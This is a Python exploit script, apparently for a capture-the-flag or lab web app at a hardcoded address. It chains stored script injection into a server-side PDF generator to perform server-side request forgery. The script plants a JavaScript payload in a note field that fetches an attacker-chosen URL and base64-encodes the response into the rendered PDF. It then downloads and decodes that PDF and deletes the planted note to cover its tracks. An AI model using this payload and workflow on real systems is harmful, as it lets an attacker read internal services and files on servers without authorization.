#!/usr/bin/env python3

import requests
import re
import PyPDF2
import base64
import sys

# Function to convert pdf files to plain text
def pdf_to_text(file_path):
    text = ""
    with open(file_path, 'rb') as file:
        reader = PyPDF2.PdfReader(file)
        for page in reader.pages:
            text += page.extract_text() + "\n"
    return text

# pdf ssrf
def pdf_ssrf():
    user_passed= sys.argv[1]
    target=f"94.237.53.113:38734"
    proxies={"http":"http://127.0.0.1:8080"}
    headers={"Content-type":"application/x-www-form-urlencoded"}

    payload=f'<script>x=new+XMLHttpRequest;x.onload=function(){{document.write(btoa(this.responseText))}};x.open("GET","{user_passed}");x.send();</script>'

    params=f"id=&title=a&color=&note={payload}"

    response= requests.get(url=f"http://{target}/actions/store-or-update.php", params=params, proxies=proxies, headers=headers, verify=False, allow_redirects=True)

    response2= requests.get(url=f"http://{target}/actions/pdf.php", proxies=proxies, allow_redirects=False)

    with open('/home/kali/Downloads/pdf.pdf','wb') as file:
        file.write(response2.content)

    response3= requests.get(url=f"http://{target}", proxies=proxies, headers=headers, verify=False, allow_redirects=True)

    for line in response3.text.splitlines():
        if "remove" in line:
            number_pattern = r'\b(\d+)\b'
            findnum= re.findall(number_pattern, line)
            num= findnum[0]
            break
        else:
            pass

    params=f"id={num}"

    response4= requests.get(url=f"http://{target}/actions/delete.php", params=params, proxies=proxies, headers=headers, verify=False, allow_redirects=True)

    pdf_file = './pdf.pdf'
    text = pdf_to_text(pdf_file)
    decoded_text= base64.b64decode(text)
    print(decoded_text)

try:
    pdf_ssrf()
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully")
